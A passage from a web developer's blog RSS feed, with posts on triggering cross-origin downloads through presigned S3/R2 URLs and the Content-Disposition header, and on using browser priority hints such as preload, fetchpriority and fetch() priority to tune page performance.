https://cms.macarthur.me/content/images/2023/10/image-3.png 1952w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;But after activating the plugin, the tool was satisfied:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image-4.png&quot; alt=&quot;PageSpeed satisfied with modern image formats&quot; loading=&quot;lazy&quot; width=&quot;1554&quot; height=&quot;476&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image-4.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image-4.png 1000w, https://cms.macarthur.me/content/images/2023/10/image-4.png 1554w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;As the site grows and times goes on, it’ll be exciting to see what kind of impact changes like this have not only on things like a site’s Core Web Vitals and SEO, but also a user’s experience as they visit it.&lt;/p&gt;&lt;p&gt;If you’d like to see what kind of impact PicPerf could have on our own site, sign up for a free, no-card-required trial. There’s not much to lose, and potentially a lot to gain.&lt;/p&gt;</content:encoded></item><item><title>TIL: A Link’s Download Attribute Won’t “Just Work” for Cross-Origin Resources</title><link>https://macarthur.me/posts/trigger-cross-origin-download</link><guid isPermaLink="true">https://macarthur.me/posts/trigger-cross-origin-download</guid><pubDate>Wed, 27 Sep 2023 04:05:22 GMT</pubDate><content:encoded>&lt;p&gt;I&apos;ve been working on a small application allowing users to upload media to a Cloudflare R2 bucket. The high-level stack is pretty simple. It&apos;s got a client-side piece (React), a middle-tier service (Fastify on Node), with Cloudflare backing the uploads. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-24.png&quot; alt=&quot;high-level diagram of my application stack&quot; loading=&quot;lazy&quot; width=&quot;1754&quot; height=&quot;356&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/09/image-24.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/09/image-24.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/09/image-24.png 1600w, https://cms.macarthur.me/content/images/2023/09/image-24.png 1754w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;To no surprise, &lt;em&gt;downloading&lt;/em&gt; that content is a part of the work too. When I began thinking through this, I was planning on streaming the objects through my Fastify server, and then straight to the users&apos; browsers. But then I remembered: there&apos;s an very handy feature built into S3 (and therefore R2, which implements the same API). &lt;/p&gt;&lt;p&gt;That feature is &lt;a href=&quot;https://docs.aws.amazon.com/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html?ref=cms.macarthur.me&quot;&gt;presigned URLs.&lt;/a&gt; When you generate one and hand it out, that person gets time-limited permission to access the file. It&apos;d be a far simpler means of getting a file out of my bucket and onto a user&apos;s device.&lt;/p&gt;&lt;h2&gt;Triggering Downloads is... Quirky.&lt;/h2&gt;&lt;p&gt;Using a presigned URL would save me a lot of time (and other resources), but I didn&apos;t want the user to click the link and navigate away from the page to access the object. So, I opted to use the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/download?ref=cms.macarthur.me&quot;&gt;&lt;code&gt;download&lt;/code&gt; attribute&lt;/a&gt; available on the &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; tag. Click such a link, and the browser will prompt you to save it to your machine.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&quot;http://my-site.com/resource.mp3&quot; download=&quot;file-name.mp3&quot;&amp;gt;
	Download Audio
&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I expected it to just work, but it didn&apos;t. Instead, it navigated to a new page, showing the resource directly in the browser. &lt;/p&gt;&lt;p&gt;I was confused, especially because some pretty good sources out there had no mention of why the browser might decide to honor or ignore the download request. Even MDN was pretty... vague about its reliability:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-25.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1576&quot; height=&quot;284&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/09/image-25.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/09/image-25.png 1000w, https://cms.macarthur.me/content/images/2023/09/image-25.png 1576w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;After some digging, that confusion moved toward clarity when I came across this in the &lt;a href=&quot;https://html.spec.whatwg.org/multipage/links.html?ref=cms.macarthur.me#downloading-resources&quot;&gt;HTML spec&lt;/a&gt;:&lt;/p&gt;&lt;blockquote&gt;In cross-origin situations, the &lt;code&gt;&lt;a href=&quot;https://html.spec.whatwg.org/multipage/links.html?ref=cms.macarthur.me#attr-hyperlink-download&quot;&gt;download&lt;/a&gt;&lt;/code&gt; attribute has to be combined with the `&lt;code&gt;&lt;a href=&quot;https://httpwg.org/specs/rfc6266.html?ref=cms.macarthur.me&quot;&gt;Content-Disposition&lt;/a&gt;&lt;/code&gt;` HTTP header [...] to avoid the user being warned of possibly nefarious activity.&lt;/blockquote&gt;&lt;p&gt;And it was all solidified after seeing notes on &lt;a href=&quot;https://chromestatus.com/feature/4969697975992320?ref=cms.macarthur.me&quot;&gt;this particular Chrome feature&lt;/a&gt;: &lt;strong&gt;browsers will ignore the &lt;code&gt;download&lt;/code&gt; for cross-origin resources.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;That explained my application&apos;s behavior. The presigned URLs came from R2 – not from my React application&apos;s domain. As a result, no download was triggered. The resource was simply treated as another navigation destination. &lt;/p&gt;&lt;h2&gt;The Server Gets the Final Say&lt;/h2&gt;&lt;p&gt;As you might&apos;ve caught above, the solution to this is simple: set the &lt;code&gt;Content-Disposition&lt;/code&gt; header on the resource to &lt;code&gt;attachment&lt;/code&gt;. This will signal to the browser that it should &lt;em&gt;download&lt;/em&gt; the resource – not navigate to it. &lt;/p&gt;&lt;p&gt;Fortunately, the &lt;a href=&quot;https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html?ref=cms.macarthur.me&quot;&gt;AWS SDK&lt;/a&gt; allows you to set custom response headers when you generate a presigned URL. I&apos;m using Node, so that meant using the &lt;code&gt;ResponseContentDisposition&lt;/code&gt; property when retrieving the object.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { GetObjectCommand } from &quot;@aws-sdk/client-s3&quot;;
import { getSignedUrl } from &quot;@aws-sdk/s3-request-presigner&quot;;

const command = new GetObjectCommand({
	Bucket: &quot;the-bucket-name&quot;,
	Key: &quot;the-file-key&quot;,
    
+	// Customize the `Content-Disposition` header!
+	ResponseContentDisposition: `attachment; filename=&quot;file-name.mp3&quot;`,
});

const signedUrl = getSignedUrl(S3, command, { expiresIn: 3600 });&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This&apos;ll give behavioral instructions to the browser, as well as provide a default name for the file when it&apos;s downloaded. I get exactly the user experience I want, and I still don&apos;t need to mess with streaming anything through my server. Cheaper, easier, and more secure. &lt;/p&gt;&lt;h2&gt;Is the Attribute Still Necessary?&lt;/h2&gt;&lt;p&gt;It might be worth calling out that after I set that &lt;code&gt;Content-Disposition&lt;/code&gt; header, the &lt;code&gt;download&lt;/code&gt; attribute didn&apos;t have any impact on what happened when my link was clicked. It would now always trigger the download.&lt;/p&gt;&lt;p&gt;Still, I can see it being useful in keeping around. It&apos;ll better signal a link&apos;s purpose to other client-side code (maybe you&apos;d like to style &lt;code&gt;download&lt;/code&gt; links differently). So, despite it not bring strictly necessary, I&apos;ll probably keep using it. I like clarity.&lt;/p&gt;&lt;h2&gt;Share Those TILs&lt;/h2&gt;&lt;p&gt;There&apos;s still a small part of me kicking myself for taking so long to realize this pretty critical piece of the &lt;code&gt;download&lt;/code&gt; attribute. But at the same time, I know I&apos;m not the only one who has these moments, so I&apos;m sure the feeling will quickly pass. If anything, let this be an encouragement to share even the smallest bits of learnings you come across out there. People like me might benefit from it.&lt;/p&gt;</content:encoded></item><item><title>Get All That Network Activity Under Control with Priority Hints</title><link>https://macarthur.me/posts/priority-hints</link><guid isPermaLink="true">https://macarthur.me/posts/priority-hints</guid><pubDate>Tue, 19 Sep 2023 00:16:58 GMT</pubDate><content:encoded>&lt;p&gt;Open up the browser&apos;s network tab and you&apos;ll see a lot of activity. Assets are being downloaded, information&apos;s being submitted, events are being logged, and more.&lt;/p&gt;&lt;p&gt;With so much going on, effectively managing the priority of that traffic is pretty critical. Bandwidth contention is real, and some HTTP requests simply don&apos;t rank as highly as others when they&apos;re all firing at once. For example, if you &lt;em&gt;had&lt;/em&gt; to choose, you&apos;d probably prefer someone&apos;s payment request successfully complete vs. an analytics request simply indicating they tried. And having your hero image show up as quickly as possible is arguably more important than your logo rendering in the footer of your page.&lt;/p&gt;&lt;p&gt;Fortunately, the browser has a growing collection of tools to help prioritize all this network activity. These &quot;&lt;a href=&quot;https://github.com/WICG/priority-hints/blob/main/EXPLAINER.md?ref=cms.macarthur.me&quot;&gt;priority hints&lt;/a&gt;&quot; help the browser make fewer assumptions and clearer decisions about which requests to favor over others when resources are limited.&lt;/p&gt;&lt;p&gt;It&apos;s a useful suite of tools, and they can make a tangible impact to page performance when leveraged well, including those increasingly important core web vitals. Let&apos;s explore a few of them, along with some scenarios in which they&apos;re most helpful.&lt;/p&gt;&lt;h2&gt;Prioritizing Preloaded Assets&lt;/h2&gt;&lt;p&gt;Modern browsers have a well-supported means of being told about resources that&apos;ll &lt;em&gt;eventually&lt;/em&gt; be needed on the current page: &lt;code&gt;&amp;lt;link rel=&quot;preload&quot; ... /&amp;gt;&lt;/code&gt;. When placed in the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt; of the document, the browser is instructed to begin downloading it as soon as possible with &quot;high&quot; priority. &lt;/p&gt;&lt;p&gt;To be fair, the preload scanner in the browser is already &lt;em&gt;really good&lt;/em&gt; at this sort of thing (&lt;a href=&quot;https://www.macarthur.me/posts/effective-preloading?ref=cms.macarthur.me&quot;&gt;I&apos;ve previously written&lt;/a&gt; about it in a little more depth). For that reason, preloading is usually best used on &lt;em&gt;late-discovered&lt;/em&gt; assets – anything not loaded directly by your HTML, like a background image loaded via an inline &lt;code&gt;style&lt;/code&gt; attribute. But it&apos;s also useful for anything else that might not be prioritized like you want by the browser. &lt;/p&gt;&lt;p&gt;Example: by default, Chrome loads a font &lt;a href=&quot;https://calendar.perfplanet.com/2022/http-3-prioritization-demystified/?ref=cms.macarthur.me&quot;&gt;with a very high priority&lt;/a&gt;, but if someone&apos;s on a slow network connection, it&apos;ll use a fallback font and lower that priority (FYI, I was initially mistaken about this behavior, thinking fonts always got &quot;lowest&quot; priority, until a discussion with &lt;a href=&quot;https://twitter.com/programmingart?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor&amp;amp;ref=cms.macarthur.me&quot;&gt;Robin Marx&lt;/a&gt;). &lt;/p&gt;&lt;p&gt;Consider a font that&apos;s loaded exclusively through a CSS &lt;code&gt;@font-face&lt;/code&gt; rule: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;@font-face {
	font-family: &quot;Inter Variable&quot;;
	src: url(&quot;./font.woff2&quot;) format(&quot;woff2&quot;);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;On load, due to the slow connection, that font gets the lowest download priority, despite it being pretty important for the visual experience of the page.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-12-highlighted.png&quot; alt=&quot;image showing low download priothe font file is given low download priority when loaded just through CSSrity of fonts&quot; loading=&quot;lazy&quot; width=&quot;1802&quot; height=&quot;682&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/09/image-12-highlighted.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/09/image-12-highlighted.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/09/image-12-highlighted.png 1600w, https://cms.macarthur.me/content/images/2023/09/image-12-highlighted.png 1802w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;But we can override the browser&apos;s decision by preloading that resource: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;head&amp;gt;
    &amp;lt;!-- Other stuff... --&amp;gt;
	&amp;lt;link rel=&quot;preload&quot; href=&quot;/font.woff2&quot; as=&quot;font&quot;&amp;gt;
&amp;lt;/head&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s now far more favored:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-12.png&quot; alt=&quot;the font is given higher download priority after being preloaded&quot; loading=&quot;lazy&quot; width=&quot;1816&quot; height=&quot;750&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/09/image-12.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/09/image-12.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/09/image-12.png 1600w, https://cms.macarthur.me/content/images/2023/09/image-12.png 1816w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;In addition, you can get &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/HTMLLinkElement/fetchPriority?ref=cms.macarthur.me&quot;&gt;even more explicit&lt;/a&gt; using the &lt;code&gt;fetchpriority&lt;/code&gt; directly on the &lt;code&gt;link&lt;/code&gt; tag. It&apos;ll let you signal relative priority when preloading multiple assets at once. &lt;/p&gt;&lt;p&gt;Here&apos;s a contrived scenario in which you&apos;d like to preload two fonts, but give one priority over the other: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;link rel=&quot;preload&quot; href=&quot;./font-1.woff2&quot; as=&quot;font&quot; fetchpriority=&quot;low&quot; /&amp;gt;
&amp;lt;link rel=&quot;preload&quot; href=&quot;./font-2.woff2&quot; as=&quot;font&quot; fetchpriority=&quot;high&quot; /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The resulting network activity reflects these instructions.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/10/image.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1596&quot; height=&quot;402&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/10/image.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/10/image.png 1000w, https://cms.macarthur.me/content/images/2023/10/image.png 1596w&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;When to Use It&lt;/h3&gt;&lt;p&gt;In general, use preloading when&lt;strong&gt; &lt;/strong&gt;an asset isn&apos;t loaded by your HTML directly, but it&apos;s critical to the experience of the page (fonts, CSS background images, etc.). And include the &lt;code&gt;fetchpriority&lt;/code&gt; attribute when preloading several resources of the same type and you&apos;re clear about which is most important.&lt;/p&gt;&lt;h2&gt;Prioritizing &lt;code&gt;fetch()&lt;/code&gt; Requests&lt;/h2&gt;&lt;p&gt;In my opinion, the Fetch API is one of the most ergonomic offerings of the modern web. And it has some nice features that &lt;code&gt;XMLHttpRequest&lt;/code&gt; lacked, like the ability to &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/fetch?ref=cms.macarthur.me&quot;&gt;signal priority&lt;/a&gt; on an outgoing request. &lt;/p&gt;&lt;p&gt;The most top-of-mind use case is one I&apos;ve already mentioned: analytics requests. When bandwidth is slim and multiple requests are in play, the browser will make its own priority decisions. But we as engineers (should) know that your typical analytics requests ought to take a back seat to others more critical to the page&apos;s purpose. Modern &lt;code&gt;fetch()&lt;/code&gt; makes that easy. &lt;/p&gt;&lt;p&gt;Here&apos;s a simple setup with two requests being queued at (virtually) the same time: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;fetch(&quot;http://localhost:8000/pay&quot;, {
	method: &quot;POST&quot;,
	body: paymentBody,
});

fetch(&quot;http://localhost:8000/log&quot;, {
	method: &quot;POST&quot;,
	body: loggingBody,
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;By default, the browser will automatically consider them both &quot;high&quot; priority: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-16.png&quot; alt=&quot;both requests will have high priority by default&quot; loading=&quot;lazy&quot; width=&quot;1126&quot; height=&quot;276&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/09/image-16.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/09/image-16.png 1000w, https://cms.macarthur.me/content/images/2023/09/image-16.png 1126w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Now, we&apos;ll explicitly tell the browser how each request should be prioritized: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;fetch(&quot;http://localhost:8000/pay&quot;, {
	method: &quot;POST&quot;,
	body: paymentBody,
+	priority: &quot;high&quot;
});

fetch(&quot;http://localhost:8000/log&quot;, {
	method: &quot;POST&quot;,
	body: loggingBody,
+	priority: &quot;low&quot;
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This time around, the priorities are different: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-17.png&quot; alt=&quot;one request now has higher priority than the other&quot; loading=&quot;lazy&quot; width=&quot;1112&quot; height=&quot;290&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/09/image-17.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/09/image-17.png 1000w, https://cms.macarthur.me/content/images/2023/09/image-17.png 1112w&quot; /&gt;&lt;/figure&gt;&lt;h4&gt;Useful counterpart: &lt;code&gt;keepalive: true&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;A possible concern here is that &quot;low&quot; priority requests may be lost to the void – cancelled if the user navigates away from the page too soon. That&apos;s a legitimate issue. Depending on a few factors, either closing the tab or moving onto the next page may cause an important, but &lt;em&gt;relatively&lt;/em&gt; low-priority request to be aborted. &lt;/p&gt;&lt;p&gt;Fortunately, &lt;code&gt;fetch()&lt;/code&gt; also accepts a &lt;code&gt;keepalive&lt;/code&gt; option. When set to &lt;code&gt;true&lt;/code&gt;, the browser will carry that request to completion even when the page is terminated. If you&apos;d like to dig into it more, take a gander at &lt;a href=&quot;https://css-tricks.com/send-an-http-request-on-page-exit/?ref=cms.macarthur.me&quot;&gt;what I wrote for for CSS-Tricks&lt;/a&gt; a while back.&lt;/p&gt;&lt;h3&gt;When to Use It&lt;/h3&gt;&lt;p&gt;Indicate &lt;code&gt;fetch()&lt;/code&gt;priority when you know multiple requests are executing concurrently, and it&apos;s clear to you which is most important (or which can safely be deprioritized). &lt;/p&gt;&lt;h2&gt;Prioritizing &lt;code&gt;&amp;lt;img /&amp;gt;&lt;/code&gt; Requests&lt;/h2&gt;&lt;p&gt;Without us doing anything special, the browser attempts to do its best at determining the most important images on a page. To illustrate this, I loaded the following images, spaced a good distance apart, so only one would be &quot;above the fold.&quot;&lt;/p&gt;&lt;pre&gt;&lt;code&gt; &amp;lt;img src=&quot;./cat-1.jpeg&quot; /&amp;gt;
 &amp;lt;div style=&quot;height: 5000px&quot;&amp;gt;&amp;lt;/div&amp;gt;
 &amp;lt;img src=&quot;./cat-2.jpeg&quot; /&amp;gt;
 &amp;lt;div style=&quot;height: 5000px&quot;&amp;gt;&amp;lt;/div&amp;gt;
 &amp;lt;img src=&quot;./cat-3.jpeg&quot; /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The browser picked up on which was most important, but it took a second. When downloading began, all three were &quot;low&quot; priority. But shortly after, the one above the fold switched to &quot;high.&quot;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/loading-priority.gif&quot; alt=&quot;priority for images shifts when loading begins&quot; loading=&quot;lazy&quot; width=&quot;514&quot; height=&quot;208&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Things became more predictable when I added a &lt;code&gt;fetchpriority&lt;/code&gt; attribute to the first image:&lt;/p&gt;&lt;pre&gt;&lt;code&gt; &amp;lt;img src=&quot;./cat-1.jpeg&quot; fetchpriority=&quot;high&quot; /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After that, &lt;code&gt;cat-1.jpeg&lt;/code&gt;loaded at the highest priority right out of the gate. While initially head-tilting, it makes sense. The browser is smart at determining resource criticality, but it benefits from clear instructions. If you know an image is important, be explicit about it.&lt;/p&gt;&lt;p&gt;This feature, by the way, pairs very nicely with native image lazy loading, a very well-supported feature these days.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&quot;./cat-1.jpeg&quot; fetchpriority=&quot;high&quot;/&amp;gt;
&amp;lt;div style=&quot;height: 5000px&quot;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;img src=&quot;./cat-2.jpeg&quot; loading=&quot;lazy&quot; /&amp;gt;
&amp;lt;div style=&quot;height: 5000px&quot;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;img src=&quot;./cat-3.jpeg&quot; loading=&quot;lazy&quot; /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With that in place, the browser knows exactly how (and if) to load images, only when appropriate. In my case, it won&apos;t even begin the request for off-screen images on initial load. Instead, it&apos;ll wait until they&apos;re closer to the viewport.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-18.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1040&quot; height=&quot;350&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/09/image-18.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/09/image-18.png 1000w, https://cms.macarthur.me/content/images/2023/09/image-18.png 1040w&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;When to Use It&lt;/h3&gt;&lt;p&gt;Use an explicit &lt;code&gt;fetchpriority&lt;/code&gt; on images when you know they&apos;re very important to page experience. Hero images are a great place to start, and it can even have an impact on a page&apos;s core web vitals – &lt;a href=&quot;https://addyosmani.com/blog/fetch-priority/?ref=cms.macarthur.me&quot;&gt;specifically, LCP&lt;/a&gt; (largest contentful paint).&lt;/p&gt;&lt;h2&gt;Prioritizing &lt;code&gt;&amp;lt;script /&amp;gt;&lt;/code&gt; Tags&lt;/h2&gt;&lt;p&gt;Any plain &lt;code&gt;&amp;lt;script /&amp;gt;&lt;/code&gt; with a &lt;code&gt;src&lt;/code&gt; attribute on a page will get &lt;code&gt;high&lt;/code&gt; priority as it&apos;s being fetched, but there&apos;s a trade-off: it blocks parsing of the rest of the page until it&apos;s loaded and executed. For that reason, the &lt;code&gt;async&lt;/code&gt; attribute is helpful. It&apos;ll request the script in the background at &lt;code&gt;low&lt;/code&gt; priority, and execute as soon as it&apos;s ready. Knowing this, the following setup behaves predictably:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script src=&quot;/script-async.js&quot; async onload=&quot;console.log(&apos;async&apos;)&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&quot;/script-sync.js&quot; onload=&quot;console.log(&apos;sync&apos;)&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;console.log(&quot;inline&quot;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The asynchronous script is demoted in priority: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-22.png&quot; alt=&quot;asynchronous script is downloaded with &amp;quot;low&amp;quot; priority&quot; loading=&quot;lazy&quot; width=&quot;1100&quot; height=&quot;296&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/09/image-22.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/09/image-22.png 1000w, https://cms.macarthur.me/content/images/2023/09/image-22.png 1100w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;And the console confirms that subsequent scripts were allowed to parse and execute as the &lt;code&gt;async&lt;/code&gt; script was loading.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/async-1.gif&quot; alt=&quot;script loaded asynchronously&quot; loading=&quot;lazy&quot; width=&quot;824&quot; height=&quot;212&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/09/async-1.gif 600w, https://cms.macarthur.me/content/images/2023/09/async-1.gif 824w&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;Non-Blocking, but High-Priority Scripts&lt;/h3&gt;&lt;p&gt;Most of the time, that behavior&apos;s fine. But sometimes, you might want a script to load both asynchronously &lt;em&gt;and&lt;/em&gt; with &quot;high&quot; priority. &lt;/p&gt;&lt;p&gt;A possible scenario is a small SPA mounted in the hero of a landing page. In order to preserve the page&apos;s core web vitals, specifically LCP and FID (first input delay, soon to be replaced by &lt;a href=&quot;https://developers.google.com/search/blog/2023/05/introducing-inp?ref=cms.macarthur.me&quot;&gt;interaction to next paint&lt;/a&gt;), you&apos;ll need that script to be highly prioritized (after all, it&apos;s responsible for building and powering your application). But at the same time, you don&apos;t want it to block the rest of the page from parsing. &lt;/p&gt;&lt;p&gt;So, let&apos;s give it a &lt;code&gt;fetchpriority&lt;/code&gt;: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;+ &amp;lt;script src=&quot;/script-async.js&quot; async onload=&quot;console.log(&apos;async&apos;)&quot; fetchpriority=&quot;high&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&quot;/script-sync.js&quot; onload=&quot;console.log(&apos;sync&apos;)&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;console.log(&quot;inline&quot;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And now, it&apos;s downloaded with elevated priority, while still not blocking the rest of the page: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/image-23.png&quot; alt=&quot;asynchronous script downloaded with high priority&quot; loading=&quot;lazy&quot; width=&quot;1204&quot; height=&quot;348&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/09/image-23.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/09/image-23.png 1000w, https://cms.macarthur.me/content/images/2023/09/image-23.png 1204w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;And the console verifies this. With that higher priority, the async script loads more quickly. In this case, even before the synchronous and inline ones. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/09/prioritized-async.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;824&quot; height=&quot;212&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/09/prioritized-async.gif 600w, https://cms.macarthur.me/content/images/2023/09/prioritized-async.gif 824w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;While I didn&apos;t toy with it specifically here, yes, &lt;code&gt;fetchpriority&lt;/code&gt; works with deferred scripts as well. &lt;/p&gt;&lt;h3&gt;When to Use It&lt;/h3&gt;&lt;p&gt;Place &lt;code&gt;fetchpriority&lt;/code&gt; on your scripts when you know their priorities up front, and if you suspect the browser won&apos;t have enough information to determine on its own. As I mentioned, it&apos;s particularly helpful for prioritizing scripts that you&apos;d also like to load in non-blocking, asynchronous way.&lt;/p&gt;&lt;h2&gt;To Be Used Intentionally&lt;/h2&gt;&lt;p&gt;It&apos;s easy to become a little overzealous about tools like this, leading to overuse. So, be careful – doing so may come at a cost. As the adage goes: &quot;emphasizing everything = emphasizing nothing.&quot; In fact, overuse may actually make it &lt;em&gt;more difficult&lt;/em&gt; for the browser to manage against network contention, &lt;em&gt;harming&lt;/em&gt; a page&apos;s performance.&lt;/p&gt;&lt;p&gt;MDN even makes a point to call it out in some of their &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/HTMLLinkElement/fetchPriority?ref=cms.macarthur.me&quot;&gt;priority hint documentation&lt;/a&gt;: &lt;/p&gt;&lt;blockquote&gt;Use it sparingly for exceptional cases where the browser may not be able to infer the best way to load the resource automatically. Over use can result in degrading performance.&lt;/blockquote&gt;&lt;p&gt;So, don&apos;t feel obligated to reach for these tools just because they exist. Wield them with care.&lt;/p&gt;&lt;h2&gt;Reviewing: When to Hint&lt;/h2&gt;&lt;p&gt;There&apos;s a lot here, so let&apos;s quickly review some times you might choose to leverage priority hints. They&apos;re not exhaustive. Just some good places to start.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Hint &lt;strong&gt;preloaded assets&lt;/strong&gt; when you want the browser to be aware of multiple late-discovered resources, some of which bring more critical to the page than others.&lt;/li&gt;&lt;li&gt;Hint &lt;strong&gt;&lt;code&gt;fetch()&lt;/code&gt; requests&lt;/strong&gt; that you know are either a crucial part of a user&apos;s experience, or can safely be deprioritized to make way for more important ones.&lt;/li&gt;&lt;li&gt;Hint above-the-fold &lt;strong&gt;images&lt;/strong&gt; you want to be loaded &amp;amp; visible as soon as possible. &lt;/li&gt;&lt;li&gt;Hint &lt;strong&gt;scripts&lt;/strong&gt; that are key to the function of a page, but you don&apos;t want to block the rest of the page (including other assets) from being parsed and downloaded.&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;Make the Browser Guess Less&lt;/h2&gt;&lt;p&gt;The browser is incredibly smart about figuring out how and when to download the stuff that makes our pages tick. But it&apos;s not always &lt;em&gt;great.&lt;/em&gt; It doesn&apos;t know why a page exists or the intent behind its individual parts. And so occasionally, it could use some extra help.&lt;/p&gt;&lt;p&gt;That&apos;s why these priority hints exist: to make instructions clear, and to leave the browser very little chance to get those decisions wrong. Keep them in mind the next time you&apos;re digging through your own application&apos;s network activity, and when it makes sense, reach for them to help make your page performance just a little more intelligent.&lt;/p&gt;</content:encoded></item><item><title>Your Cache Headers Could Probably be More Aggressive</title><link>https://macarthur.me/posts/more-aggressive-cache-headers</link><guid isPermaLink="true">https://macarthur.me/posts/more-aggressive-cache-headers</guid><pubDate>Sun, 10 